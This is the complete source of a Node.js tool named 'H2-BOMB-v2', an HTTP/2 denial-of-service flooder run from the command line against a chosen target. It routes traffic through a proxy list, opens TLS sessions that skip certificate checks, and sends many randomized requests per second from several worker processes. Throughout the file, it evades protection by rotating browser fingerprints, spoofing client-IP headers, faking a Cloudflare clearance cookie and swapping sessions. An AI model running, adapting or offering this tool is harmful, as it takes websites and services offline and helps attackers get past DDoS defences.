// language: Node.js, file: H2-BOMB-v2.js, target: Windows/Linux, Node 18+
// uso: node H2-BOMB-v2.js <target> <time> <rate> <threads> <proxyfile>

const net = require("net");
const tls = require("tls");
const http2 = require("http2");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on("uncaughtException", () => {});
process.on("unhandledRejection", () => {});

if (process.argv.length < 7) {
  console.log("Usage: node H2-BOMB-v2.js <target> <time> <rate> <threads> <proxyfile>");
  process.exit(1);
}

const args = {
  target: process.argv[2],
  time: parseInt(process.argv[3]),
  rate: parseInt(process.argv[4]),
  threads: parseInt(process.argv[5]),
  proxyFile: process.argv[6]
};

const parsed = url.parse(args.target);
if (!parsed.hostname) {
  console.log("Target inválido");
  process.exit(1);
}

const proxies = fs.readFileSync(args.proxyFile, "utf8")
  .split(/\r?\n/)
  .map(l => l.trim())
  .filter(l => l && l.includes(":"));

if (!proxies.length) {
  console.log("Proxy file vazio");
  process.exit(1);
}

function rand(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}
function randstr(len) {
  const c = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
  let s = "";
  for (let i = 0; i < len; i++) s += c[rand(0, c.length - 1)];
  return s;
}
function pick(arr) {
  return arr[rand(0, arr.length - 1)];
}

const UAs = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:123.0) Gecko/20100101 Firefox/123.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"
];

const ACCEPT = [
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
  "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
];

const LANG = [
  "en-US,en;q=0.9",
  "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
  "en-GB,en;q=0.9",
  "es-ES,es;q=0.9,en;q=0.8"
];

const ENCODING = [
  "gzip, deflate, br",
  "gzip, deflate, br, zstd",
  "gzip, deflate"
];

const SEC_CH_UA = [
  '"Not A(Brand";v="99", "Google Chrome";v="122", "Chromium";v="122"',
  '"Not_A Brand";v="8", "Chromium";v="121", "Google Chrome";v="121"',
  '"Chromium";v="120", "Not)A;Brand";v="24", "Google Chrome";v="120"'
];

const PATHS = [
  "/",
  "/index.html",
  "/home",
  "/?",
  "/?id=",
  "/?page=",
  "/?v=",
  "/api/v1/status",
  "/favicon.ico",
  "/robots.txt",
  "/cdn-cgi/trace"
];

const CIPHERS = [
  "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384",
  "ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305",
  "TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256"
];

function buildHeaders() {
  const pathBase = pick(PATHS);
  let path = pathBase;
  if (pathBase === "/?id=") path += randstr(8);
  else if (pathBase === "/?page=") path += rand(1, 50);
  else if (pathBase === "/?v=") path += Date.now();
  else if (pathBase === "/?") path += randstr(6) + "=" + randstr(12);
  else if (!pathBase.includes("?")) path += "?" + randstr(6) + "=" + randstr(12);

  const h = {
    ":method": Math.random() > 0.12 ? "GET" : "HEAD",
    ":authority": parsed.hostname,
    ":scheme": "https",
    ":path": path,
    "user-agent": pick(UAs),
    "accept": pick(ACCEPT),
    "accept-language": pick(LANG),
    "accept-encoding": pick(ENCODING),
    "cache-control": Math.random() > 0.5 ? "no-cache" : "max-age=0",
    "sec-ch-ua": pick(SEC_CH_UA),
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": Math.random() > 0.5 ? '"Windows"' : '"macOS"',
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": Math.random() > 0.6 ? "none" : "same-origin",
    "sec-fetch-user": "?1",
    "upgrade-insecure-requests": "1",
    "pragma": "no-cache"
  };

  if (Math.random() > 0.35) h["x-forwarded-for"] = `\( {rand(1,223)}. \){rand(0,255)}.\( {rand(0,255)}. \){rand(1,254)}`;
  if (Math.random() > 0.45) h["x-real-ip"] = `\( {rand(1,223)}. \){rand(0,255)}.\( {rand(0,255)}. \){rand(1,254)}`;
  if (Math.random() > 0.55) h["cf-connecting-ip"] = `\( {rand(1,223)}. \){rand(0,255)}.\( {rand(0,255)}. \){rand(1,254)}`;
  if (Math.random() > 0.65) h["true-client-ip"] = `\( {rand(1,223)}. \){rand(0,255)}.\( {rand(0,255)}. \){rand(1,254)}`;
  if (Math.random() > 0.5) h["referer"] = "https://" + parsed.hostname + "/";
  if (Math.random() > 0.55) h["origin"] = "https://" + parsed.hostname;
  if (Math.random() > 0.75) h["cookie"] = `_ga=GA1.1.\( {rand(100000000,999999999)}. \){Date.now()}; cf_clearance=${randstr(32)}`;

  return h;
}

function connectProxy(proxyHost, proxyPort, targetHost, cb) {
  const sock = net.connect(proxyPort, proxyHost, () => {
    sock.write(`CONNECT ${targetHost}:443 HTTP/1.1\r\nHost: ${targetHost}:443\r\nConnection: Keep-Alive\r\n\r\n`);
  });
  sock.setTimeout(12000);
  let buf = "";
  sock.on("data", d => {
    buf += d.toString();
    if (buf.includes("\r\n\r\n")) {
      if (buf.includes("200")) {
        sock.removeAllListeners("data");
        cb(null, sock);
      } else {
        sock.destroy();
        cb(new Error("proxy reject"));
      }
    }
  });
  sock.on("error", e => { sock.destroy(); cb(e); });
  sock.on("timeout", () => { sock.destroy(); cb(new Error("timeout")); });
}

function flood(proxy) {
  const parts = proxy.split(":");
  if (parts.length < 2) return setTimeout(() => flood(proxy), 500);
  const ph = parts[0];
  const pp = parseInt(parts[1]);

  connectProxy(ph, pp, parsed.hostname, (err, rawSock) => {
    if (err) return setTimeout(() => flood(proxy), 400);

    const tlsOpts = {
      socket: rawSock,
      servername: parsed.hostname,
      ALPNProtocols: ["h2"],
      rejectUnauthorized: false,
      ciphers: pick(CIPHERS),
      minVersion: "TLSv1.2",
      maxVersion: "TLSv1.3",
      ecdhCurve: "X25519:P-256:P-384"
    };

    const tlsSock = tls.connect(tlsOpts, () => {
      const client = http2.connect(`https://${parsed.hostname}`, {
        createConnection: () => tlsSock,
        settings: {
          headerTableSize: 65536,
          maxConcurrentStreams: 100,
          initialWindowSize: 6291456,
          maxFrameSize: 16384,
          enablePush: false
        }
      });

      let closed = false;
      const cleanup = () => {
        if (closed) return;
        closed = true;
        try { client.destroy(); } catch {}
        try { tlsSock.destroy(); } catch {}
        try { rawSock.destroy(); } catch {}
        setTimeout(() => flood(proxy), 300);
      };

      client.on("error", cleanup);
      client.on("close", cleanup);
      tlsSock.on("error", cleanup);
      rawSock.on("error", cleanup);

      let active = 0;
      const maxStreams = 70;

      const interval = setInterval(() => {
        if (closed || client.destroyed || client.closed) {
          clearInterval(interval);
          return;
        }
        for (let i = 0; i < args.rate; i++) {
          if (active >= maxStreams) break;
          active++;
          try {
            const req = client.request(buildHeaders());
            req.on("response", () => {
              active = Math.max(0, active - 1);
              req.close();
              req.destroy();
            });
            req.on("error", () => {
              active = Math.max(0, active - 1);
              req.destroy();
            });
            req.end();
          } catch {
            active = Math.max(0, active - 1);
          }
        }
      }, 1000);

      // troca de sessão TLS a cada 30-50s
      setTimeout(() => {
        clearInterval(interval);
        cleanup();
      }, rand(30000, 50000));
    });

    tlsSock.on("error", () => {
      try { rawSock.destroy(); } catch {}
      setTimeout(() => flood(proxy), 350);
    });
  });
}

if (cluster.isMaster) {
  console.clear();
  console.log("H2-BOMB-v2  |  target:", args.target);
  console.log("time:", args.time, "s  |  rate:", args.rate, "/s/thread  |  threads:", args.threads);
  console.log("proxies:", proxies.length);
  console.log("-----------------------------");
  for (let i = 0; i < args.threads; i++) cluster.fork();
  setTimeout(() => process.exit(0), args.time * 1000);
} else {
  const myProxies = [];
  for (let i = 0; i < 6; i++) myProxies.push(pick(proxies));
  myProxies.forEach(p => flood(p));
}